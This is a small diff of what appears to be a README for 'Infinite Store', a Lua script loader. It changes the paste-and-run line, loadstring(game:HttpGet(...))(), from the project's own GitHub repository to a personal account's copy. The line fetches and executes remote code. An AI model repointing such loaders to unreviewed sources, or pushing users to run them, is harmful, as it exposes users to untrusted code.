@@ -28,7 +28,7 @@
 The loader allows Infinite Store to always be kept up-to-date without re-downloading it every time you want to use it.
 
 ```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinite-Store/Infinite-Store/main/main.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/githubberguy/Infinite-Store/main/main.lua"))()
 ```
 
 ## Contributions
